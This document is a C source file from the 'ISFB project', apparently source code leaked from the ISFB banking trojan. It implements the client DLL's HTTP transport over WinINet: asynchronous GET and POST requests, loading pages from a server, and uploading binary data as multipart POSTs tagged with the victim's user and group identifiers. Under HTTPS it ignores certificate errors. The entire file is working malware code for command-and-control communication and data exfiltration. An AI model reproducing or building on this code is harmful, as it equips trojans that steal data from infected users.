//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: transfer.c
// $Revision: 358 $
// $Date: 2014-10-01 14:20:01 +0400 (Ср, 01 окт 2014) $
// description:
//	ISFB client DLL. Data send and receive routines.
//	Implements HTTP-based transport for sending and receiving data over WININTET API.

#include "..\common\common.h"
#include "..\crm.h"

#include "transfer.h"


#define		STATUS_HTTP_OK			0x00303032
#define		STATUS_HTTP_NOT_FOUND	0x00343034


//
//	Waits for the specified event object during the specified timeout.
//	It also wait for the App shutdown event and returns WAIT_TIMEOUT in case it is signaled.
//
static WINERROR TransferWait(
	HANDLE	hEvent,
	ULONG	Timeout
	)
{
	WINERROR Status;
	HANDLE	Objects[2] = {hEvent, g_AppShutdownEvent};

	Status = WaitForMultipleObjects(2, Objects, FALSE, Timeout);

	if (Status == (WAIT_OBJECT_0 + 1))
		Status = WAIT_TIMEOUT;

	return(Status);
}


BOOL	TransferInitContext(PTRANSFER_CONTEXT	Ctx)
{
	BOOL Ret = FALSE;
	memset(Ctx, 0, sizeof(TRANSFER_CONTEXT));
	if (Ctx->hEvent = CreateEvent(NULL, TRUE, FALSE, NULL))
	{
		if (Ctx->hSentEvent = CreateEvent(NULL, TRUE, TRUE, NULL))
		{
#ifdef _DEBUG
		Ctx->Magic = TRANSFER_CONTEXT_MAGIC;
#endif
		Ret = TRUE;	
		}
		else
			CloseHandle(Ctx->hEvent);
	}
	return(Ret);
}


PTRANSFER_CONTEXT	TransferAllocateContextForUrl(PCHAR Url)
{
	PTRANSFER_CONTEXT	Ctx = NULL;

	if (Ctx = hAlloc(sizeof(TRANSFER_CONTEXT) + lstrlen(Url) + 1))
	{
		if (TransferInitContext(Ctx))
			lstrcpy((PCHAR)&Ctx->Url, Url);		
		else
		{
			hFree(Ctx);
			Ctx = NULL;
		}
	}

	return(Ctx);
}

VOID	TransferReleaseContext(PTRANSFER_CONTEXT	Ctx)
{
	ASSERT_TRANSFER_CONTEXT(Ctx);

	if (Ctx->hSentEvent)
		TransferWait(Ctx->hSentEvent, TRANSFER_CONNECT_TIMEOUT);

#ifdef _DEBUG
	Ctx->Magic = ~TRANSFER_CONTEXT_MAGIC;
#endif
		
	if (Ctx->hRequest)
	{
		InternetSetStatusCallback(Ctx->hRequest, NULL);
		InternetCloseHandle(Ctx->hRequest);
	}
	if (Ctx->hConnection)
	{
		InternetSetStatusCallback(Ctx->hConnection, NULL);
		InternetCloseHandle(Ctx->hConnection);
	}

	if (Ctx->hInternet)
	{
		InternetSetStatusCallback(Ctx->hInternet, NULL);
		InternetCloseHandle(Ctx->hInternet);
	}

	if (Ctx->hEvent)
		CloseHandle(Ctx->hEvent);

	if (Ctx->hSentEvent)
		CloseHandle(Ctx->hSentEvent);

	if (Ctx->Buffer)
	{
		hFree(Ctx->Buffer);
		Ctx->Buffer = NULL;
		Ctx->Length = 0;
	}

	if (Ctx->Headers)
		hFree(Ctx->Headers);
	if (Ctx->HttpStatus)
		hFree(Ctx->HttpStatus);
}


//
//	Internet status callback function. Being called by WININET every an asynch operation completes.
//
static VOID CALLBACK TransferStatusCallback(
	HINTERNET	hInternet, 
	DWORD_PTR	dwContext, 
	ULONG		dwInternetStatus, 
	LPVOID		lpvStatusInformation, 
	DWORD		dwStatusInformationLength
	)
{
	PTRANSFER_CONTEXT	Ctx = (PTRANSFER_CONTEXT)dwContext;
	LPINTERNET_ASYNC_RESULT	AsyncResult = (LPINTERNET_ASYNC_RESULT) lpvStatusInformation;

	if (Ctx)
	{
		ASSERT_TRANSFER_CONTEXT(Ctx);
		Ctx->Status = NO_ERROR;

		switch(dwInternetStatus)
		{
		case INTERNET_STATUS_HANDLE_CREATED:
			if (!Ctx->hConnection)
			{
				// Connection handle created
				Ctx->hConnection = (HANDLE)AsyncResult->dwResult;
				SetEvent(Ctx->hEvent);
			}
			else
				// Request handle created
				Ctx->Status = 0;//CTX_DOWNLOADING;
			break;
		case INTERNET_STATUS_REQUEST_SENT:
			SetEvent(Ctx->hSentEvent);
			break;
		case INTERNET_STATUS_REQUEST_COMPLETE:

			if (Ctx->Flags & TCF_RELEASE_ON_COMPLETE)
			{
				// Releasing transfer context 
				TransferReleaseContext(Ctx);
				hFree(Ctx);
			}
			else
			{
				if (AsyncResult->dwResult == FALSE)
					Ctx->Status = AsyncResult->dwError;
				SetEvent(Ctx->hEvent);
			}
				
			break;
		case INTERNET_STATUS_HANDLE_CLOSING:
//			ASSERT(FALSE);
			break;
		default:
			break;
		}	// switch(dwInternetStatus)
	}	// if (Ctx)

	UNREFERENCED_PARAMETER(hInternet);
	UNREFERENCED_PARAMETER(dwStatusInformationLength);
}



//
//	Allocates a buffer and copies all RAW headers of the specified request into it.
//
LPSTR	TaransferGetRequestHeaders(
	HINTERNET	hRequest
	)
{
	ULONG	Index = 0, bSize = 0;
	LPSTR	pHeaders = NULL;
	
	// Querying and saving all HTTP headers of the request
	HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, NULL, &bSize, &Index);

	if (bSize && (pHeaders = hAlloc(bSize + sizeof(CHAR))))
	{
		HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, pHeaders, &bSize, &Index);
		pHeaders[bSize] = 0;
	}

	return(pHeaders);
}




//
//	Creates new HTTP request for the specified URI at the specified Host using the specified TRANSFER_CONTEXT structure.
//
static WINERROR TransferCreateRequest(
	IN	PTRANSFER_CONTEXT	Ctx,		// Pre-initialized TRANSFER_CONTEXT	structure
	IN	LPTSTR				HostName,	// Host name string
	IN	LPTSTR				Uri,		// URI (Uniform Resource Identifier) for the resource to request
	IN	LPTSTR				Method,		// HTTP method ('GET' or 'POST') for the request
	IN	LPTSTR				UserAgent	// User-agent header string
	)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	LPTSTR	pNewUri = NULL;
	ULONG	Len;

	ASSERT_TRANSFER_CONTEXT(Ctx);

	Len = lstrlen(Uri) * 2;

	if (pNewUri = hAlloc((Len + 1) * sizeof(_TCHAR)))
	{
		if (InternetCanonicalizeUrl(Uri, pNewUri, &Len, 0))
			Uri = pNewUri;
	}	// if (Len && (pNewUri = hAlloc((Len + 1) * sizeof(_TCHAR))))

	do	// not a loop
	{
		if (!(Ctx->hInternet = InternetOpen(UserAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, INTERNET_FLAG_ASYNC)))
		{
			DbgPrint("ISFB_%04x: InternetOpen Failed.\n", g_CurrentProcessId);
			break;
		}

		// Setting our internet status callback to process asynchronous operations
		if (InternetSetStatusCallback(Ctx->hInternet, &TransferStatusCallback) == INTERNET_INVALID_STATUS_CALLBACK)
			break;

		ResetEvent(Ctx->hEvent);

		// Connecting to the Host
		Ctx->hConnection = InternetConnect(Ctx->hInternet, HostName, 
#ifdef _USE_HTTPS
			INTERNET_DEFAULT_HTTPS_PORT,
#else
			INTERNET_DEFAULT_HTTP_PORT, 
#endif
			NULL, NULL, INTERNET_SERVICE_HTTP, 0, (ULONG_PTR)Ctx);

		if (!Ctx->hConnection)
		{
			if ((GetLastError() != ERROR_IO_PENDING) || (TransferWait(Ctx->hEvent, TRANSFER_CONNECT_TIMEOUT) != WAIT_OBJECT_0))
			{
				DbgPrint("ISFB_%04x: InternetConnect Failed.\n", g_CurrentProcessId);
				break;
			}
		}	// if (!Ctx->hConnection)

		// Creating new request
		Ctx->hRequest = HttpOpenRequest(Ctx->hConnection, Method, Uri, NULL, NULL, NULL,
#ifdef	_USE_HTTPS
			INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE,
#else
			INTERNET_FLAG_RELOAD | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS, 
#endif
			(DWORD_PTR)Ctx);
		if (!Ctx->hRequest)
		{
			DbgPrint("ISFB_%04x: HttpOpenRequest Failed.\n", g_CurrentProcessId);
			break;
		}
#ifdef	_USE_HTTPS
		else
		{
			ULONG	Flags;
			// Setting a flag to ignore unknown CA.
			Len = sizeof(ULONG);
			
			if (InternetQueryOption(Ctx->hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&Flags, &Len))
			{
				Flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
				InternetSetOption(Ctx->hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&Flags, sizeof(ULONG));
			}
		}
#endif	// _USE_HTTPS

		Status = NO_ERROR;

	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (pNewUri)
		hFree(pNewUri);

	return(Status);
}

//
//	Returns pointer to an URI string within the specified URL.
//
static PCHAR UrlFindUri(PCHAR Url)
{
	PCHAR Uri, Delim;

	Uri	= StrChrA(Url, '/');
	Delim = StrChrA(Url, '?');
	if ((Delim) && (!Uri || Delim < Uri))
		Uri = Delim;

	return(Uri);
}

//
//	Reallocates the specified URL and splits it into the HOST\URI pair of strings.
//
static LPSTR SplitUrl(
	LPSTR	pUrl,
	LPSTR*	ppHost,
	LPSTR*	ppUri
	)
{
	LPSTR	NewUrl = NULL, Host, Uri;

	// Reallocating URL so it could be modified later
	if (NewUrl = hAlloc(lstrlen(pUrl) + 2))
	{
		lstrcpy(NewUrl, pUrl);

		Host = NewUrl;
		Uri	= UrlFindUri(Host);

		if ((Uri) && (Uri[0] == Uri[1]))
		{
			Host = &Uri[2];
			Uri	= UrlFindUri(Host);
		}

		if (Uri)
		{
			Uri[0] = 0;
			Uri = &pUrl[Uri - NewUrl];
		}

		*ppHost = Host;
		*ppUri = Uri;
	}	// if (NewUrl = hAlloc(lstrlen(pUrl) + 2))

	return(NewUrl);
}

//
//	Initiates asynchronous receive operation for the specified URL using specified TRANSFER_CONTEXT structure.
//
WINERROR	TransferInitializeReceive(
	IN PTRANSFER_CONTEXT	Ctx,			// Pre-initialized TRANSFER_CONTEXT	structure
	IN PCHAR				pUrl,			// Target URL to receive data from
	IN PCHAR				pUserAgent,		// User-agent header string
	IN PCHAR				pRequestData,	// Additional request data to be send by POST request
	IN ULONG				RequestSize,	// Size of the additional data in bytes
	IN BOOL					bPost			// TRUE to use POST request, otherwise GET being used
	)
{
	PCHAR	NewUrl = NULL, Host, Uri;
	WINERROR	Status = ERROR_UNSUCCESSFULL;

	ASSERT_TRANSFER_CONTEXT(Ctx);
	ASSERT(pRequestData == NULL || RequestSize != 0);

	do	// not a loop
	{
		// Reallocating URL so it could be modified later
		if (!(NewUrl = SplitUrl(pUrl, &Host, &Uri)))
			break;		

		// Creating new HTTP request
		if ((Status = TransferCreateRequest(Ctx, Host, Uri, (bPost ? szPost : szGet), pUserAgent)) != NO_ERROR)
			break;

		ResetEvent(Ctx->hEvent);
		ResetEvent(Ctx->hSentEvent);

		// Sending the request
		if (!HttpSendRequest(Ctx->hRequest, NULL, 0, pRequestData, RequestSize))
		{
			if ((Status = GetLastError()) != ERROR_IO_PENDING)
			{
				// Any error occured
				DbgPrint("BH_%04x: HttpSendRequest failed with error: %u\n", g_CurrentProcessId, GetLastError());
				break;
			}
			else
			{
				ASSERT(Status == ERROR_IO_PENDING);
				// Parameter lpOptional of HttpSendRequest() must be valid until async request completes.
				//	This is not described in MSDN.
				if (pRequestData)
					// Waiting for POST request to complete...
					TransferWait(Ctx->hEvent, TRANSFER_CONNECT_TIMEOUT);
			}
		}	// if (!HttpSendRequest(Ctx->hRequest, NULL, 0, NULL, 0))
		else
			// Request complete, ParserStatusCallback will not be called.
			SetEvent(Ctx->hEvent);
	
		Status = NO_ERROR;
		DbgPrint("ISFB_%04x: TransferInitializeReceive: 0x%p, %s\n", g_CurrentProcessId, Ctx, pUrl);

	}while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (NewUrl)
		hFree(NewUrl);

    return(Status);
}


//
//	Completes asynchronous receive operation initiated for the specified TRANSFER_CONTEXT.
//	Receives data, waits until all data is received.
//
WINERROR TransferCompleteReceive(
	IN	PTRANSFER_CONTEXT	Ctx,		// Pre-initialized TRANSFER_CONTEXT	structure with initiated receive operation
	IN	BOOL				bHeaders	// TRUE if HTTP headers are need to be saved within the TRANSFER_CONTEXT structure
	)
{
	PCHAR	Buffer;
	LONG		bRead = 0, bSize, Index;
	WINERROR	Status;
	LPSTREAM	pStream;
	
	ASSERT_TRANSFER_CONTEXT(Ctx);

	// Waiting for connection complete event
	Status = TransferWait(Ctx->hEvent, TRANSFER_CONNECT_TIMEOUT);

	if (Status == WAIT_OBJECT_0 && ((Status = Ctx->Status) == NO_ERROR))
	{
		if (bHeaders)
		{
			// Querying and saving all HTTP headers of the request
			Index = 0;
			bSize = 0;
			HttpQueryInfo(Ctx->hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, NULL, &bSize, &Index);
			if (bSize && (Ctx->Headers = hAlloc(bSize + sizeof(_TCHAR))))
			{
				HttpQueryInfo(Ctx->hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, Ctx->Headers, &bSize, &Index);
				Ctx->Headers[bSize] = 0;
			}
		}	// if (bHeaders)

		Status = ERROR_NOT_ENOUGH_MEMORY;

		// Allocating a stream object to store the data received
		if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK)
		{
			// Allocating intermediate buffer to read data to
			if (Buffer = hAlloc(TRANSFER_MAX_BUFFER))
			{
				do
				{
					ResetEvent(Ctx->hEvent);
					// Reading data from a socket into the intermediate buffer
					if (!InternetReadFile(Ctx->hRequest, Buffer, TRANSFER_MAX_BUFFER, &bRead))
					{
						if ((Status = GetLastError()) != ERROR_IO_PENDING ||
							(Status = WaitForSingleObject(Ctx->hEvent, INFINITE)) != WAIT_OBJECT_0 ||
							(Status = Ctx->Status) != NO_ERROR)
						{
							ASSERT(Status != NO_ERROR);
							break;
						}
					}

					if (bRead)
						// Copying the data from the buffer into the stream
						CoInvoke(pStream, Write, Buffer, bRead, NULL);
					else
					{
						Status = NO_ERROR;
						break;
					}
					
				} while(TRUE);

				// Releasing intermediate buffer
				hFree(Buffer);
				
				if (Status == NO_ERROR)
				{
					ULONG	HttpStatus;

					Index = 0;
					bSize = sizeof(ULONG);

					if (HttpQueryInfo(Ctx->hRequest, (HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER), &HttpStatus, &bSize, &Index) && (HttpStatus == HTTP_STATUS_OK))
					{
						if (bRead = StreamGetLength(pStream))
						{
							StreamGotoBegin(pStream);
							// Allocating receive buffer that will contain all data 
							if (Buffer = hAlloc(bRead + sizeof(_TCHAR)))
							{
								CoInvoke(pStream, Read, Buffer, bRead, NULL);
								Buffer[bRead] = 0;

								Ctx->Buffer = Buffer;
								Ctx->Length = bRead;
								ASSERT(Status == NO_ERROR);
							}
							else
								Status = ERROR_NOT_ENOUGH_MEMORY;
						}	// if (bRead = StreamGetLength(pStream))
						else
							// An empty page received.
							Status = ERROR_EMPTY;
					}	// if (HttpQueryInfo(...
					else
						// No data found.
						Status = ERROR_NO_DATA;
				}	// if (Status == NO_ERROR)
			}	// if (Buffer = hAlloc(TRANSFER_MAX_BUFFER))
			CoInvoke(pStream, Release);
		}	// if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK)
	}	// if (Status == WAIT_OBJECT_0 && Ctx->Status == NO_ERROR)

	return(Status);
}

//
//	Synchronously loads page from the specified URL.
//
WINERROR TransferLoadPageEx(
	IN	PCHAR	Url,		// URL to load a page from
	IN	PCHAR	UserAgent,	// User-agent string
	IN	BOOL	bPost,		// TRUE to use POST request instead of GET
	IN	PCHAR	pSendData,	// Buffer containing data to send with the request
	IN	ULONG	SendSize,	// Size of the send buffer in bytes
	OUT	PCHAR*	pData,		// Receives pointer to allocated buffer with received content
	OUT	PULONG	pSize		// Receives size of the content buffer in bytes
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	TRANSFER_CONTEXT	Ctx;
	PCHAR		UserAgentStr = szEmptyString;

	if (UserAgent)
		UserAgentStr = UserAgent;

	*pSize = 0;

	if (TransferInitContext(&Ctx))
	{
		if ((Status = TransferInitializeReceive(&Ctx, Url, UserAgentStr, pSendData, SendSize, bPost)) == NO_ERROR)
		{
			if ((Status = TransferCompleteReceive(&Ctx, FALSE)) == NO_ERROR)
			{
				*pData = Ctx.Buffer;
				*pSize = Ctx.Length;
				Ctx.Buffer = NULL;	// Not to free it within TransferReleaseContext() 
			}
		}	// if ((Status = TransferInitializeReceive(&Ctx, Url, UserAgentStr, NULL, 0, FALSE)) == NO_ERROR)

		TransferReleaseContext(&Ctx);
	}	// if (TransferInitContext(&Ctx))

	DbgPrint("ISFB_%04x: TransferLoadPage: 0x%p, status: %u, bytes received: %d\n", g_CurrentProcessId, (PVOID)&Ctx, Status, *pSize);

	return(Status);
}


//
//	Synchronously loads page from the specified URL.
//
WINERROR TransferLoadPage(
	IN	PCHAR Url,			// URL to load a page from
	IN	PCHAR UserAgent,	// User-agent string
	OUT	PCHAR* pData,		// Receives pointer to allocated buffer with received content
	OUT	PULONG pSize		// Receives size of the content buffer in bytes
	)
{
	return(TransferLoadPageEx(Url, UserAgent, FALSE, NULL, 0, pData, pSize));
}


//
//	Sends binary data to the specified URL of the specified host.
//
WINERROR TransferInitializeSend(
	PTRANSFER_CONTEXT	Ctx,
	LPTSTR	pUrl,		// Target URL to send data
	LPVOID	Data,		// Buffer with the binary data to send.
	ULONG	Size,		// Size of the buffer in bytes
	LPTSTR	UserAgent,	// User-agent name string
	LPTSTR	FileName	// Target file name
	)
{
	WINERROR Status = ERROR_INVALID_PARAMETER;
	_TCHAR	boundary[uBoundryLen + 1] = {0};
	_TCHAR	contentTypeHeader[sizeof(szContentTypeMulti) + uBoundryLen + 1] = {0};
	_TCHAR	contentEnd[sizeof(szContEnd) + uBoundryLen + 1] = {0};
	_TCHAR	contentDisposition[256];

	LPTSTR	NewUrl = NULL, Optional = NULL, Host, Uri;
	ULONG	bSize, Ticks, ContentEndLen, OptDataLen, OptHeaderLen;

	ASSERT_TRANSFER_CONTEXT(Ctx);

	if (FileName)
		bSize = wsprintf(contentDisposition, szContDispFile, FileName);
	else
		bSize = wsprintf(contentDisposition, szContDisp, g_ClientId.UserId.Data2, g_ClientId.GroupId);

	ASSERT(bSize < 256);
	
	do	// not a loop
	{
		DbgPrint("ISFB_%04x: Sending %u bytes over HTTP to URL: %s\n", g_CurrentProcessId, Size, pUrl);

		// Reallocating URL so it could be modified later
		if (!(NewUrl = SplitUrl(pUrl, &Host, &Uri)))
			break;		

		if ((Status = TransferCreateRequest(Ctx, Host, Uri, szPost, UserAgent)) != NO_ERROR)
			break;

		Status = ERROR_UNSUCCESSFULL;
		Ticks = GetTickCount();

		bSize = wsprintf((LPTSTR)boundary, szBoundary, Ticks, Ticks, Ticks);
		ASSERT(bSize <= uBoundryLen);

		bSize = wsprintf((LPTSTR)contentTypeHeader, szContentTypeMulti, (LPTSTR)boundary);
		ASSERT(bSize <= (sizeof(szContentTypeMulti) + uBoundryLen));

		bSize = wsprintf(contentEnd, szContEnd, (LPTSTR)boundary);
		ASSERT(bSize <= (sizeof(szContEnd) + uBoundryLen));

		ContentEndLen = lstrlen((LPTSTR)contentEnd);

		if (!(HttpAddRequestHeaders(Ctx->hRequest, (LPTSTR)contentTypeHeader, (DWORD)lstrlen((const char*)contentTypeHeader), HTTP_ADDREQ_FLAG_ADD)))
		{
			DbgPrint("ISFB_%04x: HttpAddRequestHeaders failed.\n", g_CurrentProcessId);
			break;
		}

		OptDataLen = Size + sizeof(szOptional) + uBoundryLen + lstrlen(contentDisposition) + sizeof(szContentTypeApp) + ContentEndLen + 1;

		if (!(Optional = hAlloc(OptDataLen)))
			break;

		OptHeaderLen = wsprintf(Optional, szOptional, (LPTSTR)boundary, contentDisposition, szContentTypeApp);

		ASSERT((OptHeaderLen + Size + ContentEndLen) < OptDataLen);

		memcpy(Optional + OptHeaderLen, Data, Size);
		memcpy(Optional + OptHeaderLen + Size, (LPTSTR)contentEnd, ContentEndLen);

		ResetEvent(Ctx->hEvent);
		ResetEvent(Ctx->hSentEvent);

		Ctx->Buffer = Optional;
		Ctx->Length = OptHeaderLen + Size + ContentEndLen;

		if (!HttpSendRequest(Ctx->hRequest, NULL, 0, Ctx->Buffer, Ctx->Length))
		{
			if ((Status = GetLastError()) != ERROR_IO_PENDING)
				break;
		}
		Status = NO_ERROR;
		
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (NewUrl)
		hFree(NewUrl);

	return(Status);
}

//
//	Sends the specified binary data to the specified URL using HTTP POST request
//
WINERROR TransferSendData(
	LPTSTR	pUrl,		// URL to send data to
	LPVOID	Data,		// buffer containing binary data
	ULONG	Size,		// size of the buffer in bytes
	LPTSTR	UserAgent,	// (OPTIONAL) HTTP User-Agent header value for the request
	LPTSTR	FileName,	// (OPTIONAL) name of the data
	BOOL	bWait		// TRUE to wait until send operation completes
)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	PTRANSFER_CONTEXT	Ctx;
	PCHAR		UserAgentStr = szEmptyString;

	if (UserAgent)
		UserAgentStr = UserAgent;

	if (Ctx = hAlloc(sizeof(TRANSFER_CONTEXT)))
	{
		if (TransferInitContext(Ctx))
		{
			if (!bWait)
				// Mark context so it would be released when request completes
				Ctx->Flags |= TCF_RELEASE_ON_COMPLETE;

			// Send will complete asynchronuosly
			Status = TransferInitializeSend(Ctx, pUrl, Data, Size, UserAgentStr, FileName);

			if (Status == NO_ERROR)
			{
				if (bWait)
				{
					if ((Status = TransferWait(Ctx->hEvent, TRANSFER_CONNECT_TIMEOUT)) == WAIT_OBJECT_0)
					{
						if ((Status = Ctx->Status) == NO_ERROR)
						{
							ULONG	HttpStatus, Index = 0, HttpSize = sizeof(ULONG);

							if (HttpQueryInfo(Ctx->hRequest, (HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER), &HttpStatus, &HttpSize, &Index))
							{
								if (HttpStatus != HTTP_STATUS_OK)
									// Returning error code
									Status = ERROR_NO_DATA;
							}
							else
								Status = GetLastError();
						}	// if ((Status = Ctx->Status) == NO_ERROR)
					}	// if ((Status = WaitForSingleObject(Ctx->hEvent,...
					TransferReleaseContext(Ctx);
				}
			}	// if (Status == NO_ERROR)
			else
				TransferReleaseContext(Ctx);
		}	// if (TransferInitContext(Ctx))

		if (bWait || (Status != NO_ERROR))
			hFree(Ctx);
	}	// if (Ctx = hAlloc(sizeof(PTRANSFER_CONTEXT)))
	return(Status);
}